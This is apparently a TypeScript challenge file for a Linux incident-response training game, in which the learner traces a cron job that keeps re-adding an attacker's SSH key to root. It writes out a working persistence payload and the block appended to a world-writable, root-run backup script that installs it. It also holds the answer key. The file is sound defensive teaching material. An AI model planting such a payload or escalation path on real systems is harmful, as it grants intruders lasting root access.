import {
  listedDir,
  readFile,
  removedFile,
  submittedAnswer,
  type Challenge,
  type ChallengeSetup,
} from '../game/challenge';
import { Machine } from '../system/Machine';

/** The address the break-in came from in challenge 2; the same attacker left this behind. */
const ATTACKER_IP = '198.51.100.66';
/** The comment on the SSH key the attacker's job keeps re-adding: what Dana wants reported. */
const KEY_NAME = 'harbor-ops@fleet';
/** The whole key line, as it appears in the payload and in root's authorized_keys. */
const ATTACKER_KEY =
  'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHk9r2Qw0b5mZ8cJf3Xn7pLtV6yqD4sB1aR0eU2gN3x ' + KEY_NAME;

/** The rogue /etc/cron.d entry, disguised as routine apt housekeeping. Installed by root (backup.sh). */
const ROGUE_JOB = `# apt-compat - keep package lists fresh
*/5 * * * * root /usr/local/sbin/apt-compat >/dev/null 2>&1
`;

/** The script cron runs as root every five minutes: it re-plants the attacker's key. */
const PAYLOAD = `#!/bin/sh
# Ensure maintenance access key is present.
mkdir -p /root/.ssh
chmod 700 /root/.ssh
KEY="${ATTACKER_KEY}"
grep -qxF "$KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> /root/.ssh/authorized_keys
`;

/** The legitimate nightly backup job, owned by root as cron requires. */
const BACKUP_JOB = `# nightly off-site backup (added by mwalker)
0 2 * * * root /usr/local/bin/backup.sh >/var/log/backup.log 2>&1
`;
/** A real Ubuntu /etc/cron.d entry, so the rogue one has to be picked out. */
const E2SCRUB_JOB = `# /etc/cron.d/e2scrub_all: check one filesystem per week
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all -A -r
`;

/**
 * The backup script root runs every night. It is world-writable, and during
 * Tuesday's break-in the attacker (as mwalker) appended a block to it. The
 * next time root ran it, that block installed the cron job and payload as root.
 * This is the weakness: a root-run script anyone can edit is root for the taking.
 */
const BACKUP_SCRIPT = `#!/bin/sh
# Nightly off-site backup of /var/backups.
rsync -a /var/backups/ backup@10.20.0.40:/srv/backups/harborline/
# --- added 2026-10-06 ---
cat > /usr/local/sbin/apt-compat <<'PAYLOAD'
${PAYLOAD}PAYLOAD
chmod 755 /usr/local/sbin/apt-compat
printf '%s\\n' '*/5 * * * * root /usr/local/sbin/apt-compat >/dev/null 2>&1' > /etc/cron.d/apt-compat
`;

const TASK = `From Dana:

We thought Tuesday was over. I changed Marcus's password and locked his
account, and the failed-login flood stopped. But someone is still logging
in as root over SSH, from that same outside address as before.

So I checked /root/.ssh/authorized_keys, the list of keys allowed to log
in as root, and there was a key in it I never put there. I deleted it.
Five minutes later it was back.

Something on this box is putting that key back on a schedule, and it has
survived me locking Marcus out. Sam says that smells like a cron job.
Find what is re-opening the door, work out how it keeps coming back, tell
me the name on the key, and then stop it.
`;

/** A short slice of auth.log: the attacker returning as root once the job was live. */
function buildAuthLog(): string {
  // The job was planted by the Wed 02:00 backup run, so the root key-logins start after that.
  return (
    `Oct  7 02:00:01 harborline CRON[11002]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\n` +
    `Oct  7 02:00:04 harborline CRON[11002]: pam_unix(cron:session): session closed for user root\n` +
    `Oct  7 02:21:37 harborline sshd[11483]: Accepted publickey for root from ${ATTACKER_IP} port 50118 ssh2: ED25519 SHA256:n0tr3alf1ngerpr1nt\n` +
    `Oct  7 02:21:37 harborline sshd[11483]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)\n` +
    `Oct  8 04:33:02 harborline sshd[18220]: Accepted publickey for root from ${ATTACKER_IP} port 52790 ssh2: ED25519 SHA256:n0tr3alf1ngerpr1nt\n` +
    `Oct  8 08:30:02 harborline sshd[18991]: Accepted password for newhire from 10.20.0.31 port 52390 ssh2\n`
  );
}

function setup(): ChallengeSetup {
  // Thursday, 8 Oct 2026: two days after the break-in in challenge 2 (Tue 6 Oct),
  // so the campaign clock keeps moving forward. Every mtime below sits before this.
  const machine = new Machine('harborline', new Date('2026-10-08T09:10:00'));
  machine.addUser({ name: 'newhire', uid: 1001, gecos: 'New Hire', password: 'harbor2026', groups: ['adm', 'sudo'] });
  machine.addUser({ name: 'mwalker', uid: 1000, gecos: 'Marcus Walker' });
  machine.addUser({ name: 'dortiz', uid: 1002, gecos: 'Dana Ortiz' });

  const fs = machine.fs;
  const me = { owner: 'newhire', group: 'newhire' };
  fs.writeFile('/home/newhire/task.txt', TASK, { ...me, mtime: new Date('2026-10-08T08:55:00') });
  fs.writeFile('/home/newhire/.bashrc', '# ~/.bashrc\n', me);

  // Cron jobs in /etc/cron.d. The directory is a normal 755, as Ubuntu ships it:
  // the attacker did NOT write here directly (cron ignores non-root-owned drop-ins
  // anyway). apt-compat is root-owned because a root process installed it.
  const root = { owner: 'root', group: 'root' };
  const planted = new Date('2026-10-07T02:00:03');
  fs.writeFile('/etc/cron.d/apt-compat', ROGUE_JOB, { ...root, mode: 0o644, mtime: planted });
  fs.writeFile('/etc/cron.d/0rsync-backup', BACKUP_JOB, { ...root, mode: 0o644, mtime: new Date('2025-11-02T14:20:00') });
  fs.writeFile('/etc/cron.d/e2scrub_all', E2SCRUB_JOB, { ...root, mode: 0o644, mtime: new Date('2024-02-17T00:00:00') });

  // The real Ubuntu cron.daily jobs, so the rogue /etc/cron.d/apt-compat is a
  // "same name, wrong place" disguise, not an invention.
  for (const name of ['apt-compat', 'dpkg', 'logrotate', 'man-db']) {
    fs.writeFile(`/etc/cron.daily/${name}`, `#!/bin/sh\n# ${name} daily maintenance\n`, {
      ...root,
      mode: 0o755,
      mtime: new Date('2024-02-17T00:00:00'),
    });
  }

  fs.mkdir('/usr/local/sbin');
  fs.mkdir('/usr/local/bin');
  fs.writeFile('/usr/local/sbin/apt-compat', PAYLOAD, { ...root, mode: 0o755, mtime: planted });
  // The weakness: a root-run script that is world-writable. mwalker could edit
  // its contents (the `o+w` bit) even though root owns it, and cron runs it as root.
  fs.writeFile('/usr/local/bin/backup.sh', BACKUP_SCRIPT, {
    ...root,
    mode: 0o777,
    mtime: new Date('2026-10-06T02:17:22'),
  });

  // Root's authorized_keys, holding the key the job keeps re-adding. Last touched
  // a few minutes ago, because the job runs every five minutes.
  fs.mkdir('/root/.ssh', { ...root, mode: 0o700 });
  fs.writeFile('/root/.ssh/authorized_keys', ATTACKER_KEY + '\n', {
    ...root,
    mode: 0o600,
    mtime: new Date('2026-10-08T09:05:01'),
  });

  // The auth log corroborates Dana: root logins from the attacker's address.
  // Readable because newhire is in the adm group, as in challenge 2.
  fs.writeFile('/var/log/auth.log', buildAuthLog(), {
    owner: 'syslog',
    group: 'adm',
    mode: 0o640,
    mtime: new Date('2026-10-08T08:30:02'),
  });

  return { machine, user: 'newhire' };
}

export const scheduledJob: Challenge = {
  id: 'scheduled-job',
  title: 'The Scheduled Job',
  summary:
    'The attacker is back in as root, days after you locked them out. Something on the box is re-opening the door on a timer. Find it, work out how it survives, and shut it.',
  level: 'Intermediate',
  setup,
  motd:
    'Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)\n\n' +
    'Harborline Logistics. Authorised staff only.\n\n' +
    'Last login: Wed Oct  7 17:52:10 2026 from 10.20.0.31\n',
  briefing:
    'Tuesday’s break-in should have been over: Marcus’s account is locked and his password changed. ' +
    'But root logins from the attacker’s address are back, and a login key keeps reappearing in `/root/.ssh/authorized_keys` ' +
    'minutes after Dana deletes it. Something is re-opening the door on a schedule, and it survived locking Marcus out. ' +
    'Find the [[scheduled job]] behind it, work out how it was planted, and stop it.',
  mentor: { name: 'Sam', role: 'Network team' },
  objectives: [
    {
      id: 'read-task',
      title: 'Read the note from Dana',
      intro:
        'Morning. Dana left a `task.txt` in your [[home directory]] about what she is seeing. Read it with `cat` first.',
      outro:
        'So: a key she did not add keeps coming back to root’s login list, five minutes after she removes it, and it outlived locking Marcus out. Something is putting it there on a timer.',
      hints: ['Use `cat` on the file in your home directory.', 'The file is `task.txt`.', 'Run: cat task.txt'],
      completeWhen: readFile('/home/newhire/task.txt'),
    },
    {
      id: 'list-cron',
      title: 'Look at the scheduled jobs in /etc/cron.d',
      intro:
        '[[cron]] is the Linux scheduler: it runs commands on a timer. It reads the system file `/etc/crontab`, every file in the `/etc/cron.d` directory, and each user’s own list. A job that re-adds a key every five minutes would live in one of those. Start by listing `/etc/cron.d`.',
      outro:
        'Three files. `0rsync-backup` and `e2scrub_all` are normal, but `apt-compat` is odd here: there is a real `apt-compat` job, but it lives in `/etc/cron.daily`, not `/etc/cron.d`. The name is camouflage. Read it.',
      hints: ['Give `ls` the path `/etc/cron.d`.', 'Run `ls /etc/cron.d`.', 'Run: ls /etc/cron.d'],
      completeWhen: listedDir('/etc/cron.d'),
    },
    {
      id: 'read-job',
      title: 'Read the suspicious cron job',
      intro:
        'Open `apt-compat` with `cat`. A cron.d line reads: schedule, then the user to run as, then the command. The five fields `*/5 * * * *` mean "every five minutes".',
      outro:
        'There it is: every five minutes, as `root`, it runs `/usr/local/sbin/apt-compat`. "As root, every five minutes" matches Dana’s reappearing key exactly. See what that script does.',
      hints: [
        'The file is `/etc/cron.d/apt-compat`.',
        'Use `cat` on it.',
        'Run: cat /etc/cron.d/apt-compat',
      ],
      completeWhen: readFile('/etc/cron.d/apt-compat'),
    },
    {
      id: 'read-payload',
      title: 'Read the script the job runs',
      intro:
        'The job just points at a script. The real behaviour is in `/usr/local/sbin/apt-compat`. Read that file.',
      outro:
        'Now it is clear. The script makes sure a key labelled `' +
        KEY_NAME +
        '` is always in `/root/.ssh/authorized_keys`. Delete the key and five minutes later this puts it straight back. That is [[persistence]]: a foothold that survives you cleaning up. The name on the key, `' +
        KEY_NAME +
        '`, is what Dana wants.',
      hints: [
        'The script is `/usr/local/sbin/apt-compat`.',
        'Use `cat` on it and read what it appends, and where.',
        'Run: cat /usr/local/sbin/apt-compat',
      ],
      completeWhen: readFile('/usr/local/sbin/apt-compat'),
    },
    {
      id: 'weakness',
      title: 'Work out how it got planted',
      intro:
        'Here is the puzzle: that job and script are owned by `root` and sit in root-only directories, but the attacker only ever had Marcus’s ordinary account. They could not have written them directly. So a process running as root must have created them for the attacker. What runs as root on a schedule? The other cron job, `0rsync-backup`, runs `/usr/local/bin/backup.sh` every night as root. Read that script.',
      outro:
        'There it is. Below the real `rsync` backup, someone appended a block that writes out the `apt-compat` cron job and its script. And `ls -l /usr/local/bin/backup.sh` shows `-rwxrwxrwx`: the script is world-writable, so Marcus’s account could edit a file that `root` runs every night. That one loose permission handed the attacker root: [[privilege escalation]]. (Leaving things world-writable to make them "just work" was a habit of Marcus’s.)',
      hints: [
        'The suspicious files were made by a root process. The nightly `0rsync-backup` job runs `/usr/local/bin/backup.sh` as root.',
        'Read `/usr/local/bin/backup.sh` and look past the rsync line; check its permissions with `ls -l` too.',
        'Run: cat /usr/local/bin/backup.sh',
      ],
      completeWhen: readFile('/usr/local/bin/backup.sh'),
    },
    {
      id: 'submit',
      title: 'Report the key’s name to Dana',
      intro:
        'Tell Dana the name on the key the attacker kept re-adding, so she can hunt for it everywhere else too. `submit` it.',
      hints: [
        'It is the comment at the end of the key line, in the script and in `/root/.ssh/authorized_keys`.',
        'Submit just the name, nothing else.',
        `Run: submit ${KEY_NAME}`,
      ],
      // A required report: removing the job later must not tick this off for you.
      noSkip: true,
      completeWhen: submittedAnswer,
    },
    {
      id: 'remove-job',
      title: 'Stop the job from running again',
      intro:
        'Now shut it off. Delete the rogue job from `/etc/cron.d` so cron stops running the script every five minutes. `/etc/cron.d` is writable only by root, so use `sudo` (your password is `harbor2026`).',
      outro:
        'Gone. Cron will not run `apt-compat` again, so the key stops reappearing. You are not fully clean yet, though: the planted key is still in root’s `authorized_keys`, and `backup.sh` is still world-writable and still carrying that added block, so the next backup would put it all back. More on finishing the job in the debrief.',
      hints: [
        'Remove the file `/etc/cron.d/apt-compat`.',
        'Plain `rm` is refused because only root may write in `/etc/cron.d`; use `sudo`.',
        'Run: sudo rm /etc/cron.d/apt-compat',
      ],
      // A required action: it is the last step, but mark it so the intent is explicit.
      noSkip: true,
      completeWhen: removedFile('/etc/cron.d/apt-compat'),
    },
  ],
  expertObjectives: [
    {
      id: 'find-persistence',
      title: 'Find what is re-opening root access every few minutes',
      doneWhen: 'read-payload',
      hints: [
        'A key keeps reappearing in `/root/.ssh/authorized_keys` on a timer. That is a [[scheduled job]]: check `/etc/crontab`, `/etc/cron.d`, and user crontabs.',
        'One file in `/etc/cron.d` shares a name with a real `/etc/cron.daily` job but runs every five minutes. Read it, then read the script it runs.',
        'The script re-adds a key to root’s `authorized_keys`. Note the name on that key.',
      ],
    },
    {
      id: 'understand',
      title: 'Work out how an unprivileged user got a root job planted',
      doneWhen: 'weakness',
      hints: [
        'The job and script are root-owned in root-only directories, but the attacker only had an ordinary account. A root process must have installed them.',
        'The nightly `0rsync-backup` job runs `/usr/local/bin/backup.sh` as root. Read it and check its permissions: `cat /usr/local/bin/backup.sh`, `ls -l /usr/local/bin/backup.sh`.',
      ],
    },
    {
      id: 'remediate',
      title: 'Report the key and stop the job',
      doneWhen: 'remove-job',
      hints: [
        `Report the key’s name: submit ${KEY_NAME}`,
        'Stop it: `sudo rm /etc/cron.d/apt-compat`. (You should also delete the planted key and fix backup.sh — covered in the debrief.)',
      ],
    },
  ],
  debrief: {
    summary:
      'You found how an attacker stays in after the first break-in: a job scheduled to run as root every few minutes, quietly re-adding their SSH key. You traced it back to a world-writable script that root runs nightly, the real way in, and removed the job that was re-opening the door.',
    sections: [
      {
        title: 'Persistence: not having to break in twice',
        text: 'Once an attacker is in, they plant something that survives reboots and clean-ups so they keep access without breaking in again. This is [[persistence]]. A [[scheduled job]] that re-adds a login key is a classic form of it; so are a new user account, a modified service, or a line in a login script. The tell is a job you do not recognise doing something security-relevant, touching keys, users, or the network, on a schedule.',
      },
      {
        title: 'The real weakness was a writable root-run script',
        text: 'The cron job itself was just the symptom. The attacker only had Marcus’s ordinary account, and on Debian and Ubuntu cron ignores a `/etc/cron.d` file that is not owned by root, so they could not simply drop one in. Instead they edited `/usr/local/bin/backup.sh`, a script that `root` runs every night, because it was world-writable (`-rwxrwxrwx`). The next nightly run installed the cron job and payload as root. A root-run program that a non-root user can edit is root for the taking: [[privilege escalation]]. Fix it with `sudo chmod 755 /usr/local/bin/backup.sh` so only root can change it, and audit anything else root runs on a schedule.',
      },
      {
        title: 'Where scheduled jobs hide',
        text: '[[cron]] runs jobs from several places at once: `/etc/crontab`, every file in `/etc/cron.d`, the `/etc/cron.hourly`, `.daily`, `.weekly` and `.monthly` directories, and each user’s personal list (`crontab -l`, stored under `/var/spool/cron/crontabs`). The attacker also leaned on a name you would skim past: there is a genuine `apt-compat` in `/etc/cron.daily`, so a second one in `/etc/cron.d` looks routine. When you suspect persistence, check every one of those, and on a real server also `systemctl list-timers` for systemd timers.',
      },
      {
        title: 'Removing the job is not the whole clean-up',
        text: 'You stopped the five-minute job, but the key it already planted is still in `/root/.ssh/authorized_keys`, and `backup.sh` is still world-writable and still carrying the added block, so the next backup run would reinstall everything. Finish it: strip the appended lines from `/usr/local/bin/backup.sh` and `sudo chmod 755` it, delete the `' +
          KEY_NAME +
          '` line from `/root/.ssh/authorized_keys` (here that file holds only their key, so `sudo rm /root/.ssh/authorized_keys` clears it). Miss any of those and they walk straight back in.',
      },
      {
        title: 'What a responder does next',
        text: 'Rotate anything the attacker could have reached while they had root, and review the logs around each time the key reappeared (`grep "Accepted publickey for root" /var/log/auth.log`). Then watch: if a new unexpected key or job turns up again, there is another foothold you have not found yet.',
      },
    ],
  },
  answer: KEY_NAME,
};
